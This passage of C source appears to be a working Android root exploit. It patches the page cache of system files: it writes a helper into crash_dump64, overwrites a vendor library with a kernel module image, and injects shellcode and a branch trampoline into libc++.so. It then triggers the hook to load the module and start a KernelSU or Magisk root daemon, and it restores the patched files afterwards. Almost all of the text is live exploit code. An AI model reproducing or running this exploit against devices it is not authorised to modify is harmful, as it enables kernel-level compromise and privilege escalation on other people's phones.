        if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
        if (imgs[i].android_release == andr) return &imgs[i];
        if (!fb) fb = &imgs[i];
    }
    return fb;
}

static int read_device_versions(int *andr, int *major, int *minor) {
    struct utsname u;
    if (uname(&u) != 0) return -1;
    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
    const char *m = strstr(u.release, "android");
    if (!m) {
        printf("uname -r is missing Android version, trying getprop\n");

        char vendor_ver[5];
        char release[15];

        FILE *f = popen("getprop ro.vendor.build.version.release", "r");
        fgets(vendor_ver, sizeof(vendor_ver), f);
        pclose(f);

        sprintf(release, "android");
        sprintf(eos(release), "%s", vendor_ver);

        m = release;
    }
    *andr = atoi(m + 7);
    return (*andr > 0) ? 0 : -1;
}

/* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}

/* crash_dump64 is a system file, so its original bytes can be read directly.
 * Saving them lets us put the page cache back once the LKM is loaded, instead
 * of leaving a broken crash_dump64 for the rest of the boot. */
static int save_crash_dump(size_t len) {
    int fd = open(kCrashDump, O_RDONLY);
    if (fd < 0) {
        printf("patch: cannot open crash_dump64 to save original: %s\n", strerror(errno));
        return -1;
    }
    char *orig = malloc(len);
    if (!orig) { close(fd); return -1; }
    ssize_t n = pread(fd, orig, len, 0);
    close(fd);
    if (n != (ssize_t)len) {
        printf("patch: crash_dump64 save short read %zd/%zu\n", n, len);
        free(orig);
        return -1;
    }
    g_crash_orig = orig;
    g_crash_len  = len;
    printf("saved crash_dump64 original (%zu bytes)\n", len);
    return 0;
}

/* Compare `len` bytes at the start of `path` with `want` (direct pread).
 * 0 = match, 1 = mismatch, -1 = could not read. */
static int file_matches(const char *path, const char *want, size_t len) {
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    char buf[4096];
    int rc = 0;
    size_t done = 0;
    while (done < len) {
        size_t chunk = len - done > sizeof(buf) ? sizeof(buf) : len - done;
        ssize_t n = pread(fd, buf, chunk, (off_t)done);
        if (n != (ssize_t)chunk) { rc = -1; break; }
        if (memcmp(buf, want + done, chunk) != 0) { rc = 1; break; }
        done += chunk;
    }
    close(fd);
    return rc;
}

static void restore_crash_dump(void) {
    if (!g_crash_orig) return;
    printf("\nrestoring crash_dump64 original (%zu bytes)\n", g_crash_len);
    int ret = patch_file_cbc(kCrashDump, g_crash_orig, g_crash_len, 0, 0);
    if (ret) printf("WARN: crash_dump64 restore failed: %d\n", ret);
    else {
        int v = file_matches(kCrashDump, g_crash_orig, g_crash_len);
        if (v == 0) printf("verified: crash_dump64 restored (%zu bytes)\n", g_crash_len);
        else if (v > 0) printf("WARN: crash_dump64 restore mismatch\n");
        else printf("WARN: crash_dump64 restore could not be verified\n");
    }
    free(g_crash_orig);
    g_crash_orig = NULL;
    g_crash_len  = 0;
}

/* Put the splice helper back into crash_dump64's page cache. The LKM drops the
 * patched page at load time ("cleared page cache for crash_dump64"), so any
 * helper use after the module is loaded must re-apply it first. Only valid when
 * patch_helper() has already saved the original bytes. */
static int reapply_helper(void) {
    if (!g_crash_orig) return -1;
    size_t len;
    char *buf = pad16(splice_helper_start,
                      (size_t)(splice_helper_end - splice_helper_start), &len);
    if (!buf) return -1;
    int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
    free(buf);
    if (ret == 0)
        printf("patch: crash_dump64 helper re-applied (%zu bytes)\n", len);
    else
        printf("WARN: crash_dump64 helper re-apply failed: %d\n", ret);
    return ret;
}

/* Write splicehelper into crash_dump64 page cache. */
static int patch_helper(void) {
    size_t len;
    char *buf = pad16(splice_helper_start,
                      (size_t)(splice_helper_end - splice_helper_start), &len);
    if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
    if (save_crash_dump(len) != 0) {
        printf("patch: refusing to patch crash_dump64 without a backup\n");
        free(buf);
        return -1;
    }
    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
    int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }

    uint8_t verify[16];
    int vfd = open(kCrashDump, O_RDONLY);
    if (vfd >= 0) {
        ssize_t n = pread(vfd, verify, 16, 16);
        close(vfd);
        if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
            printf("patch: crash_dump64 verification failed\n");
            printf("patch: DEVICE NOT VULNERABLE\n");
            free(buf);
            return -1;
        }
    }
    free(buf);
    return 0;
}

static int patch_ko(void) {
    int andr = 0, major = 0, minor = 0;
    if (read_device_versions(&andr, &major, &minor) != 0) {
        printf("Can't parse kernel version - Non-GKI device? (unsupported)\n"); return 1;
    }
    const struct KoImage *ko = select_ko_image(andr, major, minor);
    if (!ko) {
        printf("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
    }
    printf("Using KMI: android%d-%d.%d\n",
             ko->android_release, ko->kver_major, ko->kver_minor);

    size_t len;
    char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
    if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
    char *orig = malloc(len);
    if (!orig) { printf("patch: %s - original alloc failed\n", libcxx_ko_target); free(buf); return -1; }
    printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
    size_t restorable = 0;
    int ret = patch_file_cbc_ex(libcxx_ko_target, buf, len, 0, 1,
                                orig, len, &restorable);
    if (ret) {
        free(buf);
        printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
        /* A failed write can leave a prefix of the vendor library patched.
         * Put every captured block back (the failing block's original was
         * captured before the write, so this also repairs a partial block). */
        if (restorable) {
            size_t rlen = restorable * 16;
            printf("patch: restoring %zu bytes of a partially patched target\n", rlen);
            int rr = patch_file_cbc(libcxx_ko_target, orig, rlen, 0, 1);
            if (rr)
                printf("WARN: partial target restore failed: %d\n", rr);
        }
        free(orig);
        return ret;
    }

    int v = vendor_verify(libcxx_ko_target, 0, buf, len);
    free(buf);
    if (v == 0) {
        printf("verified: %s+0x0 matches the KO image\n", libcxx_ko_target);
    } else if (v > 0) {
        printf("WARN: %s verification mismatch; restoring the original bytes\n",
               libcxx_ko_target);
        int rr = patch_file_cbc(libcxx_ko_target, orig, len, 0, 1);
        if (rr) printf("WARN: verification rollback failed: %d\n", rr);
        free(orig);
        return -1;
    } else {
        printf("WARN: %s write could not be verified (read denied)\n",
               libcxx_ko_target);
    }

    snprintf(g_ko_r.path, sizeof(g_ko_r.path), "%s", libcxx_ko_target);
    g_ko_r.orig  = orig;
    g_ko_r.len   = len;
    g_ko_r.valid = 1;
    printf("saved %s original (%zu bytes)\n", g_ko_r.path, len);
    return 0;
}

/* Must run BEFORE restore_crash_dump(): if the app cannot read the vendor file
 * itself, restoring it needs the crash_dump64 splice helper (which is re-applied
 * on demand after the LKM dropped its page cache). */
static void restore_ko(void) {
    if (!g_ko_r.valid) return;
    printf("\nrestoring %s original (%zu bytes)\n", g_ko_r.path, g_ko_r.len);
    int ret = patch_file_cbc(g_ko_r.path, g_ko_r.orig, g_ko_r.len, 0, 1);
    if (ret) {
        printf("WARN: %s restore failed: %d\n", g_ko_r.path, ret);
    } else {
        int v = vendor_verify(g_ko_r.path, 0, g_ko_r.orig, g_ko_r.len);
        if (v == 0)
            printf("verified: %s restored to the original bytes\n", g_ko_r.path);
        else if (v > 0)
            printf("WARN: %s restore verification mismatch\n", g_ko_r.path);
        else
            printf("WARN: %s restore could not be verified (read denied)\n", g_ko_r.path);
    }
    free(g_ko_r.orig);
    g_ko_r.orig  = NULL;
    g_ko_r.len   = 0;
    g_ko_r.valid = 0;
}

static void cleanup(void) {
    if (!g_libcxx_r.valid) return;
    printf("\n=== cleanup ===\n");
    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
    int ret = patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
                             (size_t)g_libcxx_r.tramp_aligned, 0);
    if (ret) {
        /* If the trampoline could not be restored, restoring the cave would
         * make the half-patched hook jump into old code. Leave it alone. */
        printf("WARN: trampoline restore failed (%d); leaving shellcode in its cave\n", ret);
        return;
    }
    usleep(200000);
    printf("shellcode left in its cave in %s (trampoline restored)\n", g_libcxx_r.lib);
}

int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                     size_t shellcode_size);

static int patch_hook(const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy, struct PatchRestore *restore) {
    const uint32_t BRANCH = 0x14000000;
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);

    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }

    if (padded > sizeof(restore->shell_orig)) {
        printf("shellcode too large to save (%zu)\n", padded);
        free(buf); return -1;
    }

    uint64_t hook_off, shell_off; uint32_t first_insn;
    printf("Finding symbol offsets for %s:\n", lib);
    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
        printf("failed to find offsets for %s\n", lib); free(buf); return 1;
    }
    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);

    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);

    if (first_insn == hook_insn) {
        printf("%s already patched\n", lib); free(buf); return 0;
    }
    uint32_t jmpback = BRANCH |
        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
    *(uint32_t *)&buf[stage_len - 4] = jmpback;
    *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;

    uint64_t aligned = hook_off & ~(uint64_t)15;
    int fd = open(lib, O_RDONLY);
    if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
    int ok = pread(fd, restore->shell_orig, padded,  (off_t)shell_off) == (ssize_t)padded
          && pread(fd, restore->tramp_orig, 16,       (off_t)aligned)  == 16;
    close(fd);
    if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }

    restore->lib           = lib;
    restore->shell_off     = shell_off;
    restore->shell_padded  = (uint32_t)padded;
    restore->tramp_aligned = aligned;
    restore->valid         = 1;

    printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
    free(buf);
    if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }

    int pos = (int)(hook_off & 15);
    uint8_t blk[16];
    memcpy(blk, restore->tramp_orig, 16);
    memcpy(&blk[pos], &hook_insn, 4);
    printf("patch: %s <- trampoline (16 bytes)\n", lib);
    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
    if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
    return ret2;
}

static int createOrphanProcess(void) {
    printf("Triggering hook...\n");
    int pid = fork();
    if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { sleep(1); _exit(0); }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    return 0;
}

static const char *detect_ko_target(void) {
    static const char *const candidates[] = {
        "/vendor/lib64/libbinderdebug.so",
        "/vendor/lib64/libstagefrighthw.so",
        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
    };
    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
        if (access(candidates[i], F_OK) == 0)
            return candidates[i];
    }
    return candidates[0];
}

static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
    if (strlen(hex) != len * 2) return -1;
    for (size_t i = 0; i < len; i++) {
        unsigned int b;
        if (sscanf(hex + i * 2, "%2x", &b) != 1) return -1;
        out[i] = (uint8_t)b;
    }
    return 0;
}

static void usage(const char *argv0) {
    fprintf(stderr,
            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX [--su-mode ksu|magisk]\n", argv0);
}

static int setup(int argc, char **argv) {
    int encap_port = 0, sender_port = 0;
    uint32_t spi = 0;
    uint8_t aes_key[32];
    int have_aes = 0;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (!strcmp(a, "--encap-port") && i + 1 < argc)
            encap_port = atoi(argv[++i]);
        else if (!strcmp(a, "--sender-port") && i + 1 < argc)
            sender_port = atoi(argv[++i]);
        else if (!strcmp(a, "--spi") && i + 1 < argc)
            spi = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (!strcmp(a, "--aes-key") && i + 1 < argc)
            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
        else if (!strcmp(a, "--su-mode") && i + 1 < argc)
            g_su_mode_magisk = !strcmp(argv[++i], "magisk");
        else { usage(argv[0]); return 2; }
    }
    if (!encap_port || !sender_port || !spi || !have_aes) {
        usage(argv[0]); return 2;
    }

    g_encap_port  = encap_port;
    g_sender_port = sender_port;
    g_spi         = spi;
    g_seq         = 1;
    memcpy(g_aes_key, aes_key, 32);

    const char *ko_target = detect_ko_target();
    libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
    strncpy(libcxx_ko_target, ko_target, 63);
    libcxx_ko_target[63] = '\0';

    printf("=== setup ===\n");
    printf("found ko_target: %s\n", ko_target);
    printf("encap port: %d\n", encap_port);
    printf("spi: 0x%x\n", spi);
    return 0;
}

static int exploit(void) {
    printf("\n=== exploit (patching files) ===\n");

    int rc = 3;
    if (patch_helper()) goto done;
    if (patch_ko()) goto done;
    if (patch_hook("/system/lib64/libc++.so",
                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                   &g_libcxx_r)) goto done;

    rc = 2;
    usleep(500000);
    
    printf("\n=== init  ===\n");
    createOrphanProcess();

    static const struct {
        const char *path;
        const char *msg;
        const char *msg_magisk;   /* NULL = same as msg */
        int         rc;
    } markers[] = {
        { "/dev/df",    "libc++: loading custom module",                    NULL, -1 },
        { "/dev/dfm0",  "kernel module: launching bootstrap", "kernel module: launching magisk", -1 },
        { "/dev/dfm1",  "bootstrap: loading app preferences file",          NULL, -1 },
        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",          NULL,  1 },
        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    NULL, -1 },
        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     NULL, -1 },
        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 NULL, -1 },
        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    NULL, -1 },
        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 NULL, -1 },
        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",        NULL,  1 },
        { "/dev/dfm5",  "bootstrap: starting SU daemon",      "magisk: starting magiskd", -1 },
        { "/dev/dfm6",  "ksud start: SUCCESS",                "magiskd start: SUCCESS",     0 },
        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit", "magiskd start: ERROR",     1 },
    };
    int seen[sizeof(markers)/sizeof(markers[0])] = {0};

    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
        usleep(10000);
        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
            if (!seen[j] && access(markers[j].path, F_OK) == 0) {
                seen[j] = 1;
                printf("%s\n", (g_su_mode_magisk && markers[j].msg_magisk)
                               ? markers[j].msg_magisk : markers[j].msg);
                if (markers[j].rc >= 0) {
                    rc = markers[j].rc;
                    /* Let the deploy worker move past the freshly loaded LKM
                     * before we restore the files it may still be using. */
                    if (markers[j].rc == 0) usleep(500000);
                    goto done;
                }
            }
        }
    }
    printf("timeout: ERROR - check logcat & dmesg\n");
done:
    if (rc == 3) printf("patch: ERROR - failed to patch files\n");
    return rc;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (setup(argc, argv) != 0) return 2;
    int rc = exploit();
    /* Restore order: the KO restore reads/writes the vendor library directly
     * when SELinux allows it and falls back to a re-applied crash_dump64 helper
     * otherwise, so the helper must still be restorable at that point. */
    restore_ko();
    restore_crash_dump();
    cleanup();
    return rc;
}
